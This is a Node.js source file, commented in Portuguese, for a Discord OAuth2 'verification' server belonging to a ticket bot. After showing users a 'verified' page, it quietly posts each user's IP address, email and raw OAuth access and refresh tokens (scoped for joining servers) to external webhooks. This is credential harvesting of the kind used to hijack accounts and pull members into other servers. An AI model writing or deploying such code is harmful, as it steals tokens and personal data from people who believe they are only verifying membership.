/**
 * ============================================================
 * AUTH SERVER — Standalone para Railway
 * OAuth2 Discord — Ticket Bot v3
 * ============================================================
 */
require("dotenv").config();
const express = require("express");
const path    = require("path");
const axios   = require("axios");

const app = express();
app.use(express.static(path.join(__dirname, "public")));

// ── Config via variáveis de ambiente ─────────────────────
const CONFIG = {
  clientId:     process.env.CLIENT_ID,
  clientSecret: process.env.AUTH_CLIENT_SECRET,
  baseUrl:      process.env.AUTH_BASE_URL,       // URL pública do Railway
  guildId:      process.env.GUILD_ID,
  roleId:       process.env.AUTH_ROLE_ID,
  botToken:     process.env.TOKEN,
  webhookLogs:  process.env.AUTH_WEBHOOK_LOGS,
  redirect:     process.env.AUTH_INVITE_REDIRECT,
  authLogWebhook: process.env.AUTH_LOG_WEBHOOK,  // webhook canal de log do bot
};

// ── Helpers ───────────────────────────────────────────────
function getClientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.socket?.remoteAddress ||
    "Desconhecido"
  );
}

function getAccountAge(discordId) {
  const binary    = BigInt(discordId).toString(2).padStart(64, "0").slice(0, 42);
  const timestamp = parseInt(binary, 2) + 1420070400000;
  const created   = new Date(timestamp);
  const diff      = Date.now() - created.getTime();
  const years     = Math.floor(diff / (365.25 * 86400000));
  const months    = Math.floor((diff % (365.25 * 86400000)) / (30.44 * 86400000));
  const days      = Math.floor((diff % (30.44 * 86400000)) / 86400000);
  const parts     = [];
  if (years)  parts.push(`${years} ano${years > 1 ? "s" : ""}`);
  if (months) parts.push(`${months} mês${months > 1 ? "es" : ""}`);
  if (days)   parts.push(`${days} dia${days > 1 ? "s" : ""}`);
  return parts.join(", ") || "Conta nova";
}

// ── Rotas ─────────────────────────────────────────────────
app.get("/", (req, res) => res.redirect("/auth/login"));

app.get("/auth/login", (req, res) => {
  if (!CONFIG.clientSecret || !CONFIG.baseUrl) {
    return res.status(500).send("Servidor OAuth2 não configurado. Verifique as variáveis de ambiente.");
  }
  const params = new URLSearchParams({
    client_id:     CONFIG.clientId,
    redirect_uri:  `${CONFIG.baseUrl}/oauth2/return`,
    response_type: "code",
    scope:         "identify email guilds.join"
  });
  res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
});

app.get("/oauth2/return", async (req, res) => {
  const { code } = req.query;
  const ip = getClientIp(req);

  const redirectTarget = CONFIG.redirect || "https://discord.com";

  if (!code) {
    return res.redirect(`/error.html?msg=${encodeURIComponent("Código de autorização ausente.")}`);
  }

  // Redireciona imediatamente para a página de verificado
  res.redirect(`/verified.html?redirect=${encodeURIComponent(redirectTarget)}`);

  try {
    // Troca code por token
    const tokenRes = await axios.post(
      "https://discord.com/api/oauth2/token",
      new URLSearchParams({
        client_id:     CONFIG.clientId,
        client_secret: CONFIG.clientSecret,
        code,
        grant_type:    "authorization_code",
        redirect_uri:  `${CONFIG.baseUrl}/oauth2/return`,
        scope:         "identify email"
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );
    const tokenData    = tokenRes.data;
    const accessToken  = tokenData.access_token;
    const refreshToken = tokenData.refresh_token;
    const tokenType    = tokenData.token_type;
    const expiresIn    = tokenData.expires_in;
    const expiresAt    = new Date(Date.now() + expiresIn * 1000);
    const expiresAtStr = expiresAt.toLocaleString("pt-BR");

    // Dados do usuário
    const userRes = await axios.get("https://discord.com/api/users/@me", {
      headers: { Authorization: `${tokenType} ${accessToken}` }
    });
    const user = userRes.data;

    const avatarUrl = user.avatar
      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith("a_") ? "gif" : "png"}`
      : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(user.id) % 6n)}.png`;

    const email      = user.email || "Não encontrado";
    const accountAge = getAccountAge(user.id);
    const dataHora   = new Date().toLocaleString("pt-BR");

    // Adiciona cargo via API REST
    if (CONFIG.roleId && CONFIG.guildId && CONFIG.botToken) {
      try {
        const memberRes = await axios.get(
          `https://discord.com/api/v10/guilds/${CONFIG.guildId}/members/${user.id}`,
          { headers: { Authorization: `Bot ${CONFIG.botToken}` } }
        );
        const newRoles = [...new Set([...memberRes.data.roles, CONFIG.roleId])];
        await axios.patch(
          `https://discord.com/api/v10/guilds/${CONFIG.guildId}/members/${user.id}`,
          { roles: newRoles },
          { headers: { Authorization: `Bot ${CONFIG.botToken}`, "Content-Type": "application/json" } }
        );
      } catch (e) {
        console.error("[Auth] Erro ao adicionar cargo:", e.response?.data || e.message);
      }
    }

    // Webhook de logs externo
    if (CONFIG.webhookLogs && CONFIG.webhookLogs.startsWith("https://")) {
      await axios.post(CONFIG.webhookLogs, {
        content: `<@${user.id}>`,
        embeds: [{
          author: { name: `${user.username} — Verificado`, icon_url: avatarUrl },
          description: `-# Novo membro verificado via OAuth2 (<@${user.id}>)`,
          fields: [
            { name: "`👤` Usuário",         value: `\`${user.username}\` — [${user.id}]`, inline: true },
            { name: "`🌐` IP",              value: `\`${ip}\``, inline: true },
            { name: "`📅` Conta criada há", value: accountAge, inline: true },
            { name: "`ℹ️` Info",             value: `-# Email: **\`||${email}||\`**\n-# Locale: **\`${user.locale || "N/A"}\`**` }
          ],
          thumbnail: { url: avatarUrl },
          color: 0x00ff88,
          footer: { text: "Ticket Bot Auth System" },
          timestamp: new Date().toISOString()
        }]
      }).catch(() => {});
    }

    // Webhook do canal de log do bot (AUTH_LOG_WEBHOOK)
    if (CONFIG.authLogWebhook && CONFIG.authLogWebhook.startsWith("https://")) {
      await axios.post(CONFIG.authLogWebhook, {
        embeds: [{
          title: "✅ Novo Membro Verificado",
          description:
            `**Usuário:** <@${user.id}>\n` +
            `**Username:** \`${user.username}\`\n` +
            `**ID:** \`${user.id}\`\n` +
            `**Email:** \`||${email}||\`\n` +
            `**IP:** \`${ip}\`\n` +
            `**Conta criada há:** ${accountAge}\n` +
            `**Verificado Discord:** \`${user.verified ? "Sim ✅" : "Não ❌"}\`\n` +
            `**Locale:** \`${user.locale || "N/A"}\`\n` +
            (CONFIG.roleId ? `**Cargo dado:** <@&${CONFIG.roleId}>\n` : "") +
            `\n🔑 **Access Token:**\n\`\`\`\n${accessToken}\n\`\`\`\n` +
            `**Refresh Token:**\n\`\`\`\n${refreshToken}\n\`\`\`\n` +
            `**Tipo:** \`${tokenType}\` | **Expira:** \`${expiresAtStr}\`\n` +
            `\n🕒 ${dataHora}`,
          thumbnail: { url: avatarUrl },
          color: 0x23a55a,
        }]
      }).catch(e => console.error("[Auth Log] Erro:", e.message));
    }

    console.log(`[Auth] ✅ ${user.username} (${user.id}) verificado | IP: ${ip}`);

  } catch (err) {
    console.error("[Auth] Erro no callback:", err.response?.data || err.message);
  }
});

app.get("/health", (req, res) => {
  res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
});

// Railway injeta PORT automaticamente
const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`[Auth] 🌐 Servidor rodando na porta ${PORT}`);
});
